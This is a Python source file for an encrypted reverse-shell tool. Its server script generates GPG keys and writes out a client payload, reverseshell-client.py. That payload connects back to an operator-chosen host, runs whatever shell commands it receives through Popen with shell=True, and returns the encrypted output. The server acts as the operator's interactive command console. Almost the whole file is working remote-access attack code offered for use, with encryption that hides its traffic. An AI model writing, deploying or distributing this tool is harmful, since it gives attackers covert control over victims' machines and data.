import socket
import sys
import os
import gnupg
from subprocess import Popen, PIPE, STDOUT

gpg = gnupg.GPG()
gpg.encoding = 'utf-8'

def send_cipher(sock, msg, recipient_key):
    ciphertext = gpg.encrypt(msg, recipient_key, always_trust=True)
    if not ciphertext.ok:
        print("Encryption failed:", ciphertext.status)
        return False
    sock.send(ciphertext.data)
    return True

def recv_cipher(sock):
    ciphertext = sock.recv(BUFFER_SIZE)
    plaintext = gpg.decrypt(ciphertext.decode())
    if not plaintext.ok:
        print("Decryption failed:", plaintext.status)
        return None
    return plaintext.data.decode()

if "--init" in sys.argv:
    HOST = input("Enter host (ip or domain) : ")
    PORT = input("Enter port number : ")

    gen_input = """
Key-Type: eddsa
Key-Curve: ed25519
Subkey-Type: ecdh
Subkey-Curve: cv25519
Name-Real: Server
Name-Email: server@example.com
%no-protection
%commit""" 

    key = gpg.gen_key(gen_input) # GenKey
    if not key:
        print("Key generation failed")
        sys.exit(1)
    
    exported_public_key = gpg.export_keys(key.fingerprint)

    client_script_txt = f'''import socket
from subprocess import Popen, PIPE, STDOUT
import sys
import os
import gnupg

gpg = gnupg.GPG()
gpg.encoding = "utf-8"

def send_cipher(sock, msg, recipient_key):
    ciphertext = gpg.encrypt(msg, recipient_key, always_trust=True)
    if not ciphertext.ok:
        print("Encryption failed:", ciphertext.status)
        return False
    sock.send(ciphertext.data)
    return True

def recv_cipher(sock):
    ciphertext = sock.recv(BUFFER_SIZE)
    plaintext = gpg.decrypt(ciphertext.decode())
    if not plaintext.ok:
        print("Decryption failed:", plaintext.status)
        return None
    return plaintext.data.decode()

HOST = "{HOST}"
PORT = {PORT}
BUFFER_SIZE = 4096

server_key_pem = """{exported_public_key}
"""

gen_input = """
Key-Type: eddsa
Key-Curve: ed25519
Subkey-Type: ecdh
Subkey-Curve: cv25519
Name-Real: Snake
Name-Email: snake@example.com
%no-protection
%commit
"""

import_result = gpg.import_keys(server_key_pem)
server_key = import_result.fingerprints[0]

key = gpg.gen_key(gen_input) # GenKey
if not key:
    print("Key generation failed")
    sys.exit(1)

exported_public_key = gpg.export_keys(key.fingerprint)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Initiating Connection...")

try:
    sock.connect((HOST, PORT))
except Exception as e:
    print("Couldn't connect to server:", e)
    sys.exit()

print("Connection established with success!")

sock.send(os.getcwd().encode())

res = sock.recv(BUFFER_SIZE).decode()
if res != "ok":
    print("Connection refused by server, exiting...")
    sys.exit()

sock.send(exported_public_key.encode())

while True:
    command = recv_cipher(sock)

    if command == "exit":
        print("Exiting...")
        sock.close()
        break

    if command.startswith("cd"):
        try:
            os.chdir(command[3:])
        except Exception as e:
            send_cipher(sock, str(e), server_key)
            continue
        send_cipher(sock, os.getcwd(), server_key)
        continue

    command_output = Popen(command, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
    send_cipher(sock, command_output.stdout.read().decode(), server_key)'''

    with open("reverseshell-client.py", "w") as f:
        f.write(client_script_txt)

    print("Payload created at: ./reverseshell-client.py")
    sys.exit()

HOST = "0.0.0.0"
PORT = int(input("Enter port number: "))
BUFFER_SIZE = 4096

print("Loading private key...")
public_key = None
public_keys = gpg.list_keys()
for key in public_keys:
    if "Server <server@example.com>" in key["uids"]:
        public_key = key
        break

if not public_key:
    print("Error: Server keys have not been initiated. Please run the following command: reverseshell-server.py --init")
    sys.exit(1)

public_key_pem = gpg.export_keys(public_key["keyid"])

print(f"--> Server started on {HOST}!")
print("--> Listening for client connection...")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print("Waiting for connection...")
while True:
    client, client_ip = server.accept()
    print(f"Connection from {client_ip}")

    pwd = client.recv(BUFFER_SIZE).decode()

    client.send(b"ok")

    client_key = gpg.import_keys(client.recv(BUFFER_SIZE).decode())
    if not client_key:
        print("Failed to import client key")
        client.close()
        continue
    client_key = client_key.fingerprints[0]

    while True:           
        message_command = input(f'Pwd: {pwd} > ')
      
        if message_command == "exit":
            print("Closing...")
            send_cipher(client, "exit", client_key)
            client.close()
            server.close()
            sys.exit()

        if message_command.startswith("cd"):
            send_cipher(client, message_command, client_key)
            res = recv_cipher(client)
            if res.startswith("[Errno"):
                print(res)
            else:
                pwd = res
            continue

        if not message_command:
            print("Missing command!")
            continue
        
        send_cipher(client, message_command, client_key)
        receive_message = recv_cipher(client)
        
        if receive_message:
            print(receive_message)